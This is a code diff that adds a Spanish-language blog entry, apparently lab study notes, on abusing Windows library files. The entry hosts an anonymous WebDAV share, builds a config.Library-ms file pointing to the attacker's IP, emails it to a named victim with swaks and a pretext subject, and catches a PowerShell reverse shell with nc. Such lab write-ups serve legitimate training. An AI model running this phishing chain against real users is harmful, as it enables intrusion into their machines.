@@ -219,6 +219,76 @@ shell.interactive()
                 </div>
             `
         }
+        {
+            id: 3,
+            title: 'Abusing Windows Library Files',
+            date: 'January 14, 2025',
+            content: `
+                <h2>Abusing Windows Library Files for Reverse Shells</h2>
+                <p>En esta sección, veremos cómo aprovechar los archivos de biblioteca de Windows y WsgiDAV para ejecutar un ataque del lado del cliente que da como resultado una reverse shell.</p>
+
+                <h3>Configurando WsgiDAV</h3>
+                <p>Ejecutaremos WsgiDAV desde el directorio <code>/home/kali/.local/bin</code>. Usaremos los siguientes parámetros para configurarlo:</p>
+                <ul>
+                    <li><strong>--host:</strong> Especifica el host desde el que servir. Escucharemos en todas las interfaces con <code>0.0.0.0</code>.</li>
+                    <li><strong>--port:</strong> Especifica el puerto de escucha. Utilizaremos el puerto <code>80</code>.</li>
+                    <li><strong>--auth:</strong> Deshabilita la autenticación con <code>anonymous</code>.</li>
+                    <li><strong>--root:</strong> Configura la raíz del directorio para el recurso compartido WebDAV.</li>
+                </ul>
+
+                <pre><code>
+kali@kali:~$ mkdir /home/kali/webdav
+kali@kali:~$ touch /home/kali/webdav/test.txt
+kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
+                </code></pre>
+
+                <h3>Creando el Archivo de Biblioteca</h3>
+                <p>Usaremos Visual Studio Code para crear un archivo de biblioteca llamado <code>config.Library-ms</code>. Este archivo incluirá configuraciones XML específicas para apuntar al recurso compartido WebDAV.</p>
+
+                <pre><code>
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+    <name>@windows.storage.dll,-34582</name>
+    <version>6</version>
+    <isLibraryPinned>true</isLibraryPinned>
+    <iconReference>imageres.dll,-1003</iconReference>
+    <templateInfo>
+        <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+    </templateInfo>
+    <searchConnectorDescriptionList>
+        <searchConnectorDescription>
+            <isDefaultSaveLocation>true</isDefaultSaveLocation>
+            <isSupported>false</isSupported>
+            <simpleLocation>
+                <url>http://192.168.119.2</url>
+            </simpleLocation>
+        </searchConnectorDescription>
+    </searchConnectorDescriptionList>
+</libraryDescription>
+                </code></pre>
+
+                <h3>Enviando el Archivo al Correo</h3>
+                <p>Podemos enviar este archivo como adjunto utilizando la herramienta <code>swaks</code>:</p>
+
+                <pre><code>
+sudo swaks -t dave.wizzard@supermagicorp.com --from test@supermagicorp.com \
+--attach @config.Library-ms --server 192.168.132.199 --body @body.txt \
+--header "Subject: Problem" --suppress-data -ap
+                </code></pre>
+
+                <p>Introduce las credenciales cuando se te solicite. Si todo se configura correctamente, la víctima ejecutará el archivo y se obtendrá una reverse shell.</p>
+
+                <h3>Ejemplo de Reverse Shell</h3>
+                <pre><code>
+kali@kali:~$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.119.2] from (UNKNOWN) [192.168.50.194] 49768
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+PS C:\Windows\System32\WindowsPowerShell\v1.0>
+                </code></pre>
+            `
+        }
     ];
 
     document.querySelectorAll('.read-more').forEach(button => {
